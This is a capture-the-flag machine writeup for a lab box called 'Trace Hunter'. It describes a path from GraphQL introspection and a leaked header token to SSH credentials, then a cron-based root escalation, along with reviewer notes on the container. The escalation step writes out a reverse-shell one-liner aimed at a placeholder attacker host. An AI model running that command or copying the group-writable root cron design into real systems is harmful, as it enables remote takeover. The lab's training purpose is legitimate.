# HTB Machine Writeup: Trace Hunter

**Author:** Rikvender Singh Rajawat

## 1. Overview
**Challenge concept:**  
A corporate DevOps telemetry dashboard built with Flask + GraphQL exposes a hidden `system_health` resolver. Developer notes contain a legacy `X-DevOps-Trace` token that unlocks the protected query and returns Base64 encoded credentials. Finding the token, decoding the payload, logging in via SSH, and then abusing a cron job yields a realistic HTB-style attack chain.  
**Difficulty:** Easy / Medium

## 2. Attack Path
1. **Recon:** `nmap -sC -sV` identifies ports `80` and `22`. Visiting `/` reveals the `/graphql` endpoint with GraphiQL enabled, guiding recon to the GraphQL schema.  
2. **GraphQL exploitation:** Introspect the schema (via GraphiQL or an automated tool). Query `developerDetails` or `userByEmail` to read the `notes` field for the `developer` account; the notes embed the legacy trace token `rjr-trace-9081`.  
3. **Credential extraction:** Re-query `systemHealth` with the header `X-DevOps-Trace: rjr-trace-9081`. The resolver returns `encoded_credentials` (e.g., `ZGV2ZWxvcGVyOkRldlBhc3MxMjEh`), which decodes to `developer:DevPass123!`.  
4. **SSH login:** Use the decoded credentials to log in as `developer` via SSH, then capture `/home/developer/user.txt` (flag).  
5. **PrivEsc (cron):** The root-owned cron job `/etc/cron.d/internal-audit` runs `/opt/internal/audit.sh` every minute. Because the file is owned by `root:developer` with group write permissions, edit it (e.g., append `bash -i >& /dev/tcp/<attacker>/4444 0>&1`) to spawn a root shell, wait for cron to run, then read `/root/root.txt`.

## 3. Intended Solution
1. Use GraphiQL/introspection to discover the `systemHealth` query and the developer notes containing the legacy trace token.  
2. Craft the `X-DevOps-Trace` header with `rjr-trace-9081`, query `systemHealth`, and Base64 decode the returned credentials.  
3. SSH into the host as `developer`, retrieve `/home/developer/user.txt`.  
4. Modify `/opt/internal/audit.sh` (group-writable) to run a shell as root when cron fires. After the root cron execution, read `/root/root.txt`.  
This flow emphasizes enumeration, header injection, credential decoding, SSH access, and a logically implied cron privilege escalation without any brute forcing.

## 4. Notes for reviewer
- The machine is delivered as a single Docker container hosting Flask/GraphQL, sshd, and cron. All relevant services are started via `entrypoint.sh`, keeping resource usage within HTB limits.  
- Cron runs `/opt/internal/audit.sh` every minute as root, and the script is intentionally group-writable by `developer`, providing the only escalation path.  
- Flags follow the HTB `HTB{...}` format and reside under `/home/developer` and `/root`.  
- The GraphQL issue hides credentials behind a header token discovered through enumeration (notes) + header crafting, not direct leaks.  
- Dependencies (`Flask`, `Flask-GraphQL`, `graphene`) are pinned in `requirements.txt`. The provided Dockerfile can rebuild the same environment for reproducibility.
